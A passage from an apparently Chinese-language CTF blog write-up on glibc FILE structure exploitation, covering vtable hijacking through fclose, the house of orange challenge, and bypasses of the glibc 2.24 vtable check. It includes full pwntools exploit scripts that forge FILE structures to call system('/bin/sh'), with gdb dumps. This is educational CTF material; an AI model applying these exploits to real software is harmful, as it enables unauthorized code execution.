chunk放入unsorted bin中之后将其作为FILE结构体，并将虚表设置在了FILE结构体中，最后触发malloc_printerr，内部调用<strong>libc_message，再内部调用abort，abort中调用fflush即_IO_flush_all_lockp，其中调用</strong>OVERFLOW时调用 vtable中的 __overflow，触发system(‘/bin/sh’)。</p><p>当然利用方法不止这一种，也能够使程序去调用其他函数getshell。</p><h1 id="利用实例"><a href="#利用实例" class="headerlink" title="利用实例"></a>利用实例</h1><h2 id="task-challenge1"><a href="#task-challenge1" class="headerlink" title="task_challenge1"></a>task_challenge1</h2><h3 id="方向"><a href="#方向" class="headerlink" title="方向"></a>方向</h3><p>控制fp指针伪造FILE 与 vtable，因为fclose时调用vtable中的_finish，所以将其覆盖为system</p><p>伪造的FILE结构体前四个字节需要满足 flags &amp; is_filebuf 即 flags &amp; 0x2000为0，会直接调用_io_finish<br>0xffffdfff  &amp; 0x2000 = 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#define _IO_IS_FILEBUF 0x2000</span><br><span class="line"></span><br><span class="line">if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br><span class="line"></span><br><span class="line">  _IO_acquire_lock (fp);</span><br><span class="line">  if (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br><span class="line">  else</span><br><span class="line">    status = fp-&gt;_flags &amp; _IO_ERR_SEEN ? -1 : 0;</span><br><span class="line">  _IO_release_lock (fp);</span><br><span class="line">  _IO_FINISH (fp);</span><br></pre></td></tr></table></figure><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>一道iofile练手题，与pwnable.tw上那道有些相似，可以输入，输出，退出</p><p>输入直接调用gets，在bss段，可以覆盖打开文件的指针，伪造结构体可以一块进行<br>退出会调用fclose关闭文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.bss:00000000006010C0 ; char s[256]</span><br><span class="line">.bss:00000000006010C0 s               db 100h dup(?)          ; DATA XREF: get+4↑o</span><br><span class="line">.bss:00000000006010C0                                         ; put+4↑o</span><br><span class="line">.bss:00000000006011C0 ; FILE *stream</span><br><span class="line">.bss:00000000006011C0 stream          dq ?                    ; DATA XREF: exits+4↑r</span><br></pre></td></tr></table></figure></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./task_challenge1&apos;)</span><br><span class="line">elf = ELF(&apos;./task_challenge1&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;task_challenge1&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf_addr = 0x6010c0</span><br><span class="line">system = 0x400897</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_file = p32(0xffffdfff)+&apos;;/bin/sh\x00&apos;</span><br><span class="line">fake_file = fake_file.ljust(0xd8,&apos;\0&apos;)</span><br><span class="line">vtable = buf_addr+0xe0</span><br><span class="line">fake_file += p64(vtable)</span><br><span class="line"></span><br><span class="line">pay = fake_file</span><br><span class="line">pay += p64(0)*2</span><br><span class="line">pay += p64(system)             #vtable finish , fclose will call this func.</span><br><span class="line">pay = pay.ljust(0x100,&apos;\0&apos;)</span><br><span class="line">pay += p64(buf_addr)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(&apos;&gt;&apos;,&apos;1&apos;)</span><br><span class="line">sh.sendline(pay)</span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">#sh.recv()</span><br><span class="line">#sh.sendline(&apos;3&apos;)</span><br><span class="line">#exits()</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><h3 id="方向-1"><a href="#方向-1" class="headerlink" title="方向"></a>方向</h3><p>就是演示代码的实际利用。</p><p>malloc_printerr 会调用_io_overflow<br>伪造被放入unsorted bin中的top chunk为FILE 结构体，使之能够绕过检查进入_IO_OVERFLOW (fp, EOF)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)  //需要bypass的条件</span><br><span class="line">#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T</span><br><span class="line">   || (_IO_vtable_offset (fp) == 0</span><br><span class="line">       &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))                        </span><br><span class="line">#endif</span><br><span class="line">   )</span><br><span class="line">  &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)                              //改 _IO_OVERFLOW 为 system 劫持程序流！</span><br><span class="line">result = EOF;</span><br></pre></td></tr></table></figure><p>即需要满足任意一种<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1.fp-&gt;_mode &lt;= 0</span><br><span class="line">2.fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base</span><br><span class="line">或</span><br><span class="line">1._IO_vtable_offset (fp) == 0</span><br><span class="line">2.fp-&gt;_mode &gt; 0</span><br><span class="line">3.fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span><br></pre></td></tr></table></figure></p><h3 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h3><p>house of orange 的开山之作，因而之后这种利用方法就叫做house of orange<br>题目可以 build ,upgrade ,see<br>build 会创建三个chunk，一个保存其中两个的指针，一个保存大小与颜色，最后为用户自定义大小不大于0x1000的chunk。<br>upgrade 时没有考虑build时的大小，所以会直接溢出<br>see 正常展示，后面会用来泄露</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">import sys</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">#context.log_level = &apos;debug&apos;</span><br><span class="line">#context.terminal = [&apos;gnome-terminal&apos;,&apos;-x&apos;,&apos;bash&apos;,&apos;-c&apos;]</span><br><span class="line"></span><br><span class="line">if len(sys.argv) &gt; 1:</span><br><span class="line">local = 0</span><br><span class="line">else:</span><br><span class="line">local = 1</span><br><span class="line"></span><br><span class="line">if local:</span><br><span class="line">sh = process(&apos;./houseoforange&apos;)</span><br><span class="line">elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line">else:</span><br><span class="line">sh = remote(&apos;&apos;,&apos;&apos;)</span><br><span class="line">elf = ELF(&apos;./houseoforange&apos;)</span><br><span class="line">#libc=ELF(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">def build(size,name,price,color):</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;1&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(price))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def see():</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;2&quot;)</span><br><span class="line"></span><br><span class="line">def upgrade(size,name,price,color):</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(&quot;3&quot;)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(size))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.send(name)</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(price))</span><br><span class="line">sh.recvuntil(&quot;:&quot;)</span><br><span class="line">sh.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">build(0x20,&apos;1&apos;,20,1)</span><br><span class="line">pay = &apos;a&apos;*0x20+p64(0)+p64(0x21)+&apos;b&apos;*0x10+p64(0)+p64(0xf91)</span><br><span class="line">upgrade(len(pay),pay,20,1)</span><br><span class="line"></span><br><span class="line">#trigger _sys_malloc</span><br><span class="line">build(0x1000,&apos;2&apos;,20,2)</span><br><span class="line"></span><br><span class="line">build(0x400,&apos;3&apos;*8,20,3)</span><br><span class="line">see()</span><br><span class="line">sh.recvuntil(&apos;3&apos;*8)</span><br><span class="line">libc.base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\0&apos;))-0x3c5188</span><br><span class="line">print hex(libc.base)</span><br><span class="line">io_list_all = libc.base + libc.symbols[&apos;_IO_list_all&apos;]</span><br><span class="line">print hex(io_list_all)</span><br><span class="line">system = libc.base + libc.symbols[&apos;system&apos;]</span><br><span class="line">print hex(system)</span><br><span class="line"></span><br><span class="line">upgrade(0x400,&apos;4&apos;*16,20,4)</span><br><span class="line">see()</span><br><span class="line">sh.recvuntil(&apos;4&apos;*16)</span><br><span class="line">heap_base = u64(sh.recvuntil(&apos;\n&apos;,drop=True).ljust(8,&apos;\0&apos;))-0xd0</span><br><span class="line">print hex(heap_base)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay = &apos;e&apos;*0x400</span><br><span class="line">pay += p64(0)+p64(0x21)+p32(1)+p32(0x14)+p64(0)</span><br><span class="line"></span><br><span class="line"># mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0</span><br><span class="line">fake_file = &apos;/bin/sh\x00&apos;+p64(0x61)</span><br><span class="line">fake_file += p64(0xdeadbeef) + p64(io_list_all-0x10) #unsorted bin attack</span><br><span class="line">fake_file = fake_file.ljust(0xa0,&apos;\x00&apos;)</span><br><span class="line">fake_file += p64(heap_base+0x4e0)  #wide_data</span><br><span class="line">fake_file = fake_file.ljust(0xc0,&apos;\x00&apos;)</span><br><span class="line">fake_file += p64(1)  # mode</span><br><span class="line"></span><br><span class="line"># write_base &lt; write_ptr &amp;&amp; mode &lt;=0    </span><br><span class="line">fake_file2 = &apos;/bin/sh\x00&apos;+p64(0x61)</span><br><span class="line">fake_file2 += p64(0xdeadbeef) + p64(io_list_all-0x10)</span><br><span class="line">fake_file2 += p64(0) + p64(1)  # write_base &amp; write_ptr</span><br><span class="line">fake_file2 = fake_file2.ljust(0xc0,&apos;\x00&apos;)</span><br><span class="line">fake_file2 += p64(0)  # mode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pay += fake_file         # fake_file &amp; fake_file2 对应着两种绕过检查</span><br><span class="line">pay += p64(0) + p64(0)  </span><br><span class="line">pay += p64(heap_base+0x610) #vtable</span><br><span class="line"></span><br><span class="line">pay += p64(0)*2+p64(system)*10</span><br><span class="line"></span><br><span class="line">upgrade(0x800,pay,20,5)</span><br><span class="line"></span><br><span class="line">#gdb.attach(sh)</span><br><span class="line">sh.sendline(&apos;1&apos;)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><ul><li><p>mode &gt;0 &amp;&amp; wide_data-&gt;write_ptr &gt; wide_data-&gt;write_base &amp;&amp; vtable_offset == 0</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; p *(struct _IO_FILE_plus *) 0x55b527f0b500</span><br><span class="line">$2 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, </span><br><span class="line">    _IO_read_base = 0x7fa084964510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x0, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x55b527f0b4e0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x55b527f0b610</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>write_base &lt; write_ptr &amp;&amp; mode &lt;=0    </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; p *(struct _IO_FILE_plus *) 0x55731d86f500 </span><br><span class="line">$1 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = 1852400175, </span><br><span class="line">    _IO_read_ptr = 0x61 &lt;error: Cannot access memory at address 0x61&gt;, </span><br><span class="line">    _IO_read_end = 0xdeadbeef &lt;error: Cannot access memory at address 0xdeadbeef&gt;, </span><br><span class="line">    _IO_read_base = 0x7fbcf865f510 &quot;&quot;, </span><br><span class="line">    _IO_write_base = 0x0, </span><br><span class="line">    _IO_write_ptr = 0x1 &lt;error: Cannot access memory at address 0x1&gt;, </span><br><span class="line">    _IO_write_end = 0x0, </span><br><span class="line">    _IO_buf_base = 0x0, </span><br><span class="line">    _IO_buf_end = 0x0, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = 0, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x0, </span><br><span class="line">    _offset = 0, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x0, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = 0, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x55731d86f610</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ul><h2 id="ciscn-2019-n-7"><a href="#ciscn-2019-n-7" class="headerlink" title="ciscn_2019_n_7"></a>ciscn_2019_n_7</h2><p>华北赛区的一道半决赛题</p><h3 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h3><p>三个功能 add edit show<br>add只能使用一次，会将name 和 指针保存在堆中，且获取name的时候会有八个字节的溢出，刚好可以覆盖指针，<br>edit会先修改name ，再根据保存的指针来修改内存值，所以可以任意地址写<br>另：输入666可以得到puts的实际地址，因此可以泄露libc</p><h3 id="方向-2"><a href="#方向-2" class="headerlink" title="方向"></a>方向</h3><p>666 泄露libc，add或edit来修改指针，原计划修改malloc_hook为onegadget，但是鉴于在add之后不再有malloc 或者free，因此不可行。<br>很自然的想到修改IO_file 虚表来使程序退出时能够触发来getshell。</p><h3 id="exp-2"><a href="#exp-2" class="headerlink" title="exp"></a>exp</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="2-24-check-绕过"><a href="#2-24-check-绕过" class="headerlink" title="2.24 check 绕过"></a>2.24 check 绕过</h1><p>前面已经知道从2.24开始添加了对虚表的检查，使得没有办法任意地址伪造vtable。所以有了一些不用伪造虚表的利用办法</p><h2 id="IO-buf-base-amp-IO-buf-end"><a href="#IO-buf-base-amp-IO-buf-end" class="headerlink" title="_IO_buf_base &amp; _IO_buf_end"></a>_IO_buf_base &amp; _IO_buf_end</h2><p>再调用相关stdin的函数如——read , scanf等函数时，会对__IO_stdin 的 _IO_buf_base ,_IO_buf_end, _IO_read_ptr, _IO_read_base, _IO_read_end 进行初始化，因为底层调用的malloc，所以一般都会分配到堆里。</p><p>可以随便写个小程序测试下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">char *ptr = malloc(0x20);</span><br><span class="line">int a;</span><br><span class="line">scanf(&quot;%d&quot;,&amp;a);</span><br><span class="line">printf(&quot;%d&quot;,a);</span><br><span class="line">free(ptr);</span><br><span class="line">return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>加上调试符号编译，scanf过后，可以看到堆中添加了一个大小为0x411的chunk，这个chunk就是开辟的缓冲区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">0x602000 FASTBIN &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 49, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602030 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 1041, </span><br><span class="line">  fd = 0xa363534333231, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line">0x602440 PREV_INUSE &#123;</span><br><span class="line">  prev_size = 0, </span><br><span class="line">  size = 134081, </span><br><span class="line">  fd = 0x0, </span><br><span class="line">  bk = 0x0, </span><br><span class="line">  fd_nextsize = 0x0, </span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&gt; p *(struct _IO_FILE_plus *) stdin</span><br><span class="line">$3 = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = -72539512, </span><br><span class="line">    _IO_read_ptr = 0x602046 &quot;\n&quot;, </span><br><span class="line">    _IO_read_end = 0x602047 &quot;&quot;, </span><br><span class="line">    _IO_read_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_ptr = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_write_end = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_buf_base = 0x602040 &quot;123456\n&quot;, </span><br><span class="line">    _IO_buf_end = 0x602440 &quot;&quot;, </span><br><span class="line">    _IO_save_base = 0x0, </span><br><span class="line">    _IO_backup_base = 0x0, </span><br><span class="line">    _IO_save_end = 0x0, </span><br><span class="line">    _markers = 0x0, </span><br><span class="line">    _chain = 0x0, </span><br><span class="line">    _fileno = 0, </span><br><span class="line">    _flags2 = 0, </span><br><span class="line">    _old_offset = -1, </span><br><span class="line">    _cur_column = 0, </span><br><span class="line">    _vtable_offset = 0 &apos;\000&apos;, </span><br><span class="line">    _shortbuf = &quot;&quot;, </span><br><span class="line">    _lock = 0x7ffff7dd7770 &lt;_IO_stdfile_0_lock&gt;, </span><br><span class="line">    _offset = -1, </span><br><span class="line">    _codecvt = 0x0, </span><br><span class="line">    _wide_data = 0x7ffff7dd59a0 &lt;_IO_wide_data_0&gt;, </span><br><span class="line">    _freeres_list = 0x0, </span><br><span class="line">    _freeres_buf = 0x0, </span><br><span class="line">    __pad5 = 0, </span><br><span class="line">    _mode = -1, </span><br><span class="line">    _unused2 = &apos;\000&apos; &lt;repeats 19 times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = 0x7ffff7dd2440 &lt;__GI__IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>例如我们在使用scanf对栈中的临时变量赋值时，作为缓冲区，数据也会在这边被同步保存，因而如果能够控制_IO_buf_base指针，就能够实现任意地址写。</p><p>同理printf等也会开辟输出缓冲区，通过修改也能够做到任意地址读。</p><h2 id="IO-str-jumps"><a href="#IO-str-jumps" class="headerlink" title="_IO_str_jumps"></a>_IO_str_jumps</h2><p>libc不止有_IO_file_jumps这个虚表，还有_IO_str_jumps 与 _IO_wstr_jumps等虚表，一般前者更好利用<br>所以将伪造的结构体vtable指针指向这个虚表，再对其进行利用</p><p>_IO_str_jumps 定义于/libio/strops.c中<br><figure class="highlight plain"><table><tr><td 